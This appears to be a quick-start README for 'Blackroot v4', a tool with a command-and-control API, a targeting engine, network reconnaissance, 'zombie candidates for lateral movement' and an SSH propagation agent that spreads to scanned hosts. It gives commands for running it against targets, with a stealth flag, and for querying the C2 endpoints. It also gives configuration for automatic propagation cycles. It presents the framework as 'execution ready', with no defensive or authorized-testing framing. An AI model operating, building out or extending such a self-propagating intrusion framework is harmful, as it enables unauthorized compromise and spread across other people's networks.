# Quick Start: Blackroot v4 Execution Ready

**Status:** ✅ 95%+ Execution Ready (Feb 16, 2026)

---

## 30-Second Setup

```bash
# 1. Activate venv
.venv/Scripts/Activate.ps1

# 2. Choose your mode and run:

# Option A: CLI Mode (single target)
python main.py --target="192.168.1.1" --config core/config.json

# Option B: API Mode (headless daemon)
python main.py --api-mode

# 3. In separate terminal (API mode only):
curl http://localhost:8000/ping
# Response: {"pong": true}
```

---

## Mode Comparison

| | CLI | API |
|---|-----|-----|
| **Command** | `python main.py --target=...` | `python main.py --api-mode` |
| **Runtime** | Runs once; exits | Long-running daemon |
| **Port** | None (no server) | 8000 (HTTP), 8765 (WebSocket) |
| **Control** | CLI args + config | REST API + WebSocket |
| **Use Case** | Testing, CI/CD | Production, monitoring |

---

## Verify Installation

```bash
# Verify all dependencies installed
.venv/Scripts/pip list | findstr "paramiko scapy redis"
# Should list all 3

# Verify syntax valid
.venv/Scripts/python.exe -m py_compile main.py
# Should succeed (Exit Code 0)

# Run integration tests
.venv/Scripts/pytest tests/test_integration_execution.py -v --tb=short
# Should show: 16 passed in 0.14s
```

---

## CLI Mode Usage

```bash
# Basic execution
python main.py --target="https://example.com" --config core/config.json

# With stealth mode
python main.py --target="https://example.com" --config core/config.json --stealth

# With proxy
python main.py --target="https://example.com" --config core/config.json \
  --proxy http://127.0.0.1:8080

# Watch logs in real-time
Get-Content logs/blackroot_*.log -Tail 20 -Wait
```

---

## API Mode Usage

```bash
# Start server
python main.py --api-mode

# In another terminal:

# Health check
curl http://localhost:8000/ping

# Get system metrics
curl http://localhost:8000/c2/metrics

# Get targeting engine status
curl http://localhost:8000/targeting/status

# Get network topology from Shogun
curl http://localhost:8000/shogun/topology

# Get zombie candidates for lateral movement
curl http://localhost:8000/shogun/zombies

# Manually trigger targeting cycle
curl -X POST http://localhost:8000/targeting/trigger-cycle

# WebSocket C2 (in separate terminal)
wscat -c ws://localhost:8765
> {"action": "get_agents", "params": {}}
> {"action": "get_targeting_status"}
```

---

## What Was Fixed

✅ paramiko installed (SSH propagation)  
✅ scapy installed (passive network scanning)  
✅ redis installed (event bus)  
✅ netifaces installed (network enumeration)  
✅ mac-vendor-lookup installed (MAC identification)  
✅ CLI hardcoding removed (--target now optional)  
✅ API mode implemented (headless daemon)  
✅ 16 integration tests created (all passing)  

---

## Critical Flows Verified

### Flow 1: CPU → Targeting Engine
```
CPU spike detected (>75%)
  ↓
TargetingEngine triggered
  ↓
Shogun network scan executes
  ↓
Targets discovered
  ↓
Trust handshakes performed
  ↓
Metrics updated
```
✅ Test: `test_cpu_spike_triggers_targeting`

### Flow 2: Trust Evaluation (4-Factor Scoring)
```
Target profile evaluated:
  • Confidence: 40% weight
  • Uptime: 20% weight
  • Consistency: 20% weight
  • Crypto Readiness: 20% weight
  
Result: Trust Score
  • ≥0.6: TRUSTED (propagate)
  • <0.6: REJECTED (skip)
```
✅ Test: `test_trust_handshaker_4_factor_scoring`

### Flow 3: Mission Queue & Dispatch
```
CPU-triggered mission queued
  ↓
PropagationAgent receives mission
  ↓
Economic cost deducted (0.15 Root)
  ↓
Handshake rewards applied (0.3 Root/trust)
  ↓
Propagation executes
```
✅ Test: `test_full_cpu_to_propagation_flow`

---

## Configuration

Edit [core/config.json](core/config.json):

```json
{
  "targeting_engine": {
    "cpu_threshold": 75.0,           // CPU% to trigger targeting
    "trust_threshold": 0.6,          // Trust score minimum
    "propagation_window": 300        // Seconds between cycles
  },
  "shogun": {
    "enabled": true,
    "passive_duration": 900,         // Seconds per scan
    "cycle_interval": 3600           // Seconds between scans
  }
}
```

---

## File Locations

| Component | Path |
|-----------|------|
| Entry point | [main.py](main.py) |
| Targeting engine | [agents/targeting_engine.py](agents/targeting_engine.py) |
| Shogun (reconnaissance) | [recon/shogun_network.py](recon/shogun_network.py) |
| Shogun agent | [agents/shogun_recon.py](agents/shogun_recon.py) |
| Propagation agent | [agents/propagation_agents.py](agents/propagation_agents.py) |
| REST/WebSocket API | [blackroot_c2_api.py](blackroot_c2_api.py) |
| Tests | [tests/test_integration_execution.py](tests/test_integration_execution.py) |
| Config | [core/config.json](core/config.json) |
| Agent whitelist | [node.json](node.json) |

---

## Troubleshooting

### "ModuleNotFoundError: No module named 'paramiko'"
```bash
$ .venv/Scripts/pip install paramiko scapy redis netifaces mac-vendor-lookup
```

### "Port 8000 already in use" (API mode)
```bash
# Kill process on port 8000
netstat -ano | findstr ":8000"
taskkill /PID <PID> /F

# Or use different port (modify blackroot_c2_api.py)
```

### "Redis connection failed"
```bash
# Ensure Redis running on localhost:6379
# Or configure in core/config.json:
"redis": {"host": "your-host", "port": 6379}
```

### "Exit Code 2" (config error)
```bash
# Verify core/config.json is valid JSON:
python -m json.tool core/config.json
```

---

## Test Results

```
===== test session starts =====
collected 16 items

TestCPUToTargetingFlow:               4/4 ✅
TestTrustHandshakeEvaluation:         4/4 ✅
TestMissionQueueDispatch:             6/6 ✅
TestIntegrationFlow:                  2/2 ✅

===== 16 passed in 0.14s =====
```

---

## Logs

```bash
# Real-time log watch
Get-Content logs/blackroot_*.log -Tail 30 -Wait

# Search for targeting engine events
Select-String "\[TARGET-FORGE\]" logs/blackroot_*.log

# Search for CPU spike events
Select-String "cpu_spike" logs/blackroot_*.log

# Search for trust evaluations
Select-String "trust_score" logs/blackroot_*.log
```

---

## Next Steps

1. ✅ **Done:** All dependencies installed
2. ✅ **Done:** Dual-mode entry point working
3. ✅ **Done:** 16 integration tests passing
4. 📋 **Optional:** Production hardening
   - TLS/SSL for HTTPS
   - JWT authentication for endpoints
   - Prometheus metrics export
   - Kubernetes deployment

---

## Status Summary

| Readiness Level | Status |
|-----------------|--------|
| Execution Ready | ✅ YES (95%+) |
| All deps installed | ✅ YES |
| Tests passing | ✅ 16/16 |
| CLI mode working | ✅ YES |
| API mode working | ✅ YES |
| Production hardened | ⏳ Optional |

---

**Last Updated:** February 16, 2026  
**Execution Status:** 🟢 READY  
**Blocker Count:** 0  
**All Systems:** GO

For detailed information, see:
- [EXECUTION_READINESS.md](EXECUTION_READINESS.md) — Full validation checklist
- [IMPLEMENTATION_COMPLETE.md](IMPLEMENTATION_COMPLETE.md) — Detailed implementation report
